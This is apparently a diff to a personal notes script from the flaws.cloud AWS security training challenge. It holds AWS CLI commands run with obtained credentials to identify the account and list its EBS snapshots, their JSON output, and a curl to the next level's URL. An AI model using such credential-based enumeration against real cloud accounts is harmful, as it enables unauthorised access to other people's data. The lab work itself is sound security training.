@@ -147,3 +147,40 @@ aws ec2 describe-instances --profile flaws
     ]
 }'
 
+# "InstanceId": "i-05bef8a081f307783",
+
+aws --profile flaws sts get-caller-identity
+:'{
+    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
+    "Account": "975426262029",
+    "Arn": "arn:aws:iam::975426262029:user/backup"
+}'
+# "Account": "975426262029",
+aws --profile flaws  ec2 describe-snapshots --owner-id 975426262029
+:'{
+    "Snapshots": [
+        {
+            "Description": "",
+            "Encrypted": false,
+            "OwnerId": "975426262029",
+            "Progress": "100%",
+            "SnapshotId": "snap-0b49342abd1bdcb89",
+            "StartTime": "2017-02-28T01:35:12.000Z",
+            "State": "completed",
+            "VolumeId": "vol-04f1c039bc13ea950",
+            "VolumeSize": 8,
+            "Tags": [
+                {
+                    "Key": "Name",
+                    "Value": "flaws backup 2017.02.27"
+                }
+            ]
+        }
+    ]
+}'
+#"SnapshotId": "snap-0b49342abd1bdcb89",
+
+#next needed to copy to AWS, don't want to attach this to my credit card or a real Experian aws account! 
+#followed hints instead got username and password to get to :
+
+curl http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/
